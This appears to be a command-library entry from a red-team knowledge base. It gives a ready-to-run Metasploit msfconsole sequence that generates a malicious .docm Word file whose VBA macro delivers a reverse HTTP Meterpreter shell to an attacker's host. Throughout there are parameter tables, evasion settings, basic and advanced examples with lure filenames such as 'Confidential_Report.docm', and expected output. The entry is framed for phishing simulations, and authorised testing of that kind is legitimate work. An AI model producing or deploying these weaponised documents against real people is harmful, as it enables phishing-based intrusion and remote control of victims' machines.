---
id: fdcf59ca-887f-47c0-b7c6-8d87b9f5f76f
name: generate-malicious-office-word-macro-metasploit
type: command
executor: msfconsole
data: |-
  use exploit/multi/fileformat/office_word_macro
  set payload windows/meterpreter/reverse_http
  set LHOST $_LHOST
  set LPORT $_LPORT
  set DisablePayloadHandler True
  set PrependMigrate True
  set FILENAME $_FILENAME
  exploit -j
output: null
created_at: '2023-04-06T03:56:23.367520+00:00'
updated_at: '2023-04-10T20:36:54.125958+00:00'
platforms:
  - Linux
tags:
  - metasploit
  - macro
  - payload
verified: true
validated: true
---

# generate-malicious-office-word-macro-metasploit

## Command

```msfconsole
use exploit/multi/fileformat/office_word_macro
set payload windows/meterpreter/reverse_http
set LHOST $_LHOST
set LPORT $_LPORT
set DisablePayloadHandler True
set PrependMigrate True
set FILENAME $_FILENAME
exploit -j
```

## Description

This multi-line command sequence in Metasploit's console generates a malicious .docm Word file with an embedded VBA macro that delivers a reverse HTTP Meterpreter payload. Use this during phishing simulations to create deliverable artifacts for initial access testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LHOST | Attacker's IP address for the reverse connection | Yes |
| $_LPORT | Port for the listener (e.g., 80 for HTTP) | Yes |
| $_FILENAME | Name of the output .docm file (e.g., Financial2021.docm) | Yes |
| DisablePayloadHandler | Disables Metasploit's automatic handler (set to True for external handlers) | No |
| PrependMigrate | Enables payload migration to a new process post-execution (set to True for evasion) | No |

## Examples

### Basic Usage

```msfconsole
use exploit/multi/fileformat/office_word_macro
set payload windows/meterpreter/reverse_http
set LHOST 10.10.10.10
set LPORT 80
set FILENAME test.docm
exploit -j
```

### Advanced Usage

```msfconsole
use exploit/multi/fileformat/office_word_macro
set payload windows/meterpreter/reverse_http
set LHOST 192.168.1.100
set LPORT 443
set DisablePayloadHandler True
set PrependMigrate True
set FILENAME Confidential_Report.docm
exploit -j
```

## Expected Output

[*] Started reverse HTTP handler on $_LHOST:$_LPORT 
[*] Encoding payload as raw shellcode
[*] Generating VBA macro...
[*] $_FILENAME generated successfully.

The .docm file is created in the current Metasploit directory, ready for delivery.

## Related

- [[procedures/Office-Word-Macro-Payload-Delivery-with-Metasploit]]
- [[tools/Metasploit-Framework]]
